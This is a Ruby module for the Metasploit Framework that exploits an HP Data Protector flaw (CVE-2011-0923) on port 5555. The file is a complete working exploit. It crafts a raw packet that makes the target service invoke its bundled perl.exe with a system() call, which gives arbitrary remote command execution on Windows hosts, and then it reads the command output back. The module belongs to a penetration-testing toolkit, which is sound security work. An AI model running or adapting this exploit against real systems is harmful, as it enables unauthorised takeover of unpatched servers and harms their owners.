##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'HP Data Protector Arbitrary Remote Command Execution',
			'Description'	=> %q{
				This script allows to execute a command with an arbitrary number
				of arguments on Microsoft Windows operating systems. The trick 
				calls a perl.exe interpreter installed with HP Data Protector 
				inside the directory {install_path}/bin/.
				
				The main goal of the script is to bypass the limitation of execute
				only a single command without parameters, as provided by already existing
                                exploits. It is possible to exploit the security issue in order to run 
                                any command inside the target system. 
			},

			'License'	=> MSF_LICENSE,
			'Author'        =>
				[
					'Alessandro Di Pinto <alessandro.dipinto () artificialstudios org>',
					'Claudio Moletta <mclaudio () gmail com>',
				],
			'References' 	=>
				[
					[ 'CVE', '2011-0923'],
					[ 'OSVDB', '72526'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-055/'],
					[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02781143'],
				],
		))

		register_options(
			[
				Opt::RPORT(5555),
				OptString.new('CMD', [ true, 'The OS command to execute', 'ipconfig /all'])
			], self.class)
	end

	def run
		begin
			command = datastore['CMD']
			command = command.gsub("\\","\\\\\\")
			offset = 45
    			size_command = (offset + command.length).chr

			crafted_pkt = "\x00\x00\x00"
			crafted_pkt << size_command
			crafted_pkt << "\x32\x00\x01"
			crafted_pkt << "\x01\x01\x01"
			crafted_pkt << "\x01\x01\x00"
			crafted_pkt << "\x01\x00\x01"
			crafted_pkt << "\x00\x01\x00"
			crafted_pkt << "\x01\x01\x00"
			crafted_pkt << "\x2028\x00"
			crafted_pkt << "\\perl.exe"
			crafted_pkt << "\x00 -esystem('#{command}')\x00"

			print_status "Connecting to target '#{rhost}:#{rport}'"
			connect
			print_good "Connected"
				if (datastore['CMD'])
				print_status "Sending payload '#{command}'\n"
				sock.put(crafted_pkt)
				# Clean and parse results
				while true
					response_size = sock.recv(4)
					response_size = response_size.unpack('N')[0]
					break if response_size.nil?
					response = sock.recv(response_size)[5..-1]
					response = response.delete("\x00")
					# Check for the end-of-message
					break if response.include?("RETVAL") 
					print response if not response.empty?
				end
			end
			disconnect

		rescue ::Rex::ConnectionRefused
			print_error "Connection refused '#{rhost}:#{rport}'"
		rescue ::Rex::ConnectionError
			print_error "Connection error '#{rhost}:#{rport}'"
		end
	end

end
